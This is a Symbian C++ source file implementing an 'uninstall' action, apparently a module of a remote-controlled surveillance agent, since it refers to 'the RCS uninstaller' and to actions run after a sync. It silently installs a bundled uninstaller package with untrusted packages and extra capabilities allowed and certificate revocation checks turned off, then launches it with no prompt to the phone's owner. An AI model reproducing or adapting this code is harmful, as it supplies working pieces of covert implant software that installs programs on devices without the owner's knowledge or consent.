/*
 * ActionUninstall.cpp
 *
 *  Created on: 18/giu/2010
 *      Author: Giovanna
 */

#include <apgcli.h> // for RApaLsSession
#include <apacmdln.h> // for CApaCommandLine

#include <swinstapi.h>			// Uninstaller
#include <swinstdefs.h>

#include "ActionUninstall.h"
#include "Keys.h"


CActionUninstall::CActionUninstall(TQueueType aQueueType) :
	CAbstractAction(EAction_Uninstall, aQueueType)
	{
	// No implementation required
	}

CActionUninstall::~CActionUninstall()
	{
	
	}

CActionUninstall* CActionUninstall::NewLC(const TDesC8& params, TQueueType aQueueType)
	{
	CActionUninstall* self = new (ELeave) CActionUninstall(aQueueType);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionUninstall* CActionUninstall::NewL(const TDesC8& params, TQueueType aQueueType)
	{
	CActionUninstall* self = CActionUninstall::NewLC(params, aQueueType);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionUninstall::ConstructL(const TDesC8& params)
	{
		BaseConstructL(params);
	}

void CActionUninstall::DispatchStartCommandL()
	{
		/**
		 * All the files are generated/downloaded into private app folder and automatically
		 * deleted during uninstall.
		 */
	TInt value = 0;
	if(iConditioned)
		{
		// we are conditioned by a previous sync, we get the result
		RProperty::Get(KPropertyUidCore, KPropertyStopSubactions,value);
		}
	if(value == 0)
		{
		// Install the RCS uninstaller
		InstallAppL();
		
		// Launch Uninstaller
		LaunchAppL();
		}	
	}

void CActionUninstall::LaunchAppL(){
	
	TThreadId app_threadid;
	CApaCommandLine* cmdLine; 
	cmdLine=CApaCommandLine::NewLC();
	cmdLine->SetExecutableNameL(_L("Uninstaller.exe"));
	cmdLine->SetCommandL( EApaCommandRun );
	RApaLsSession ls;
	User::LeaveIfError(ls.Connect());
	TInt err=ls.StartApp(*cmdLine,app_threadid);
	ls.Close();
	CleanupStack::PopAndDestroy(); // cmdLine
}

void CActionUninstall::InstallAppL(){

	// Prepare for silent install
	SwiUI::RSWInstSilentLauncher      launcher; 
	SwiUI::TInstallOptions            options;
	SwiUI::TInstallOptionsPckg        optionsPckg;	
	
	// Connect to the server
	User::LeaveIfError( launcher.Connect() );
	  
	// See SWInstDefs.h for more info about these options
	options.iUpgrade = SwiUI::EPolicyAllowed;
	options.iOCSP = SwiUI::EPolicyNotAllowed;
	options.iDrive = 'C';   // Hard-coded as phone memory  
	options.iUntrusted = SwiUI::EPolicyAllowed; 
	options.iCapabilities = SwiUI::EPolicyAllowed;
	    
	optionsPckg = options;
	
	// Create path
	TBuf<48> path;
	path.Append(_L("C:\\Private\\"));
	TBuf<12> uid;
	uid.Copy(KUidCore);
	uid.Copy(uid.Mid(2,uid.Length()-2));
	path.Append(uid);
	path.Append(_L("\\Uninstaller.sisx"));
	
	// Start synchronous install
	TInt err = KErrNone;
	//err = launcher.SilentInstall(_L("C:\\Private\\20030635\\Uninstaller.sisx"),optionsPckg);
	err = launcher.SilentInstall(path,optionsPckg);
		
	launcher.Close();
}

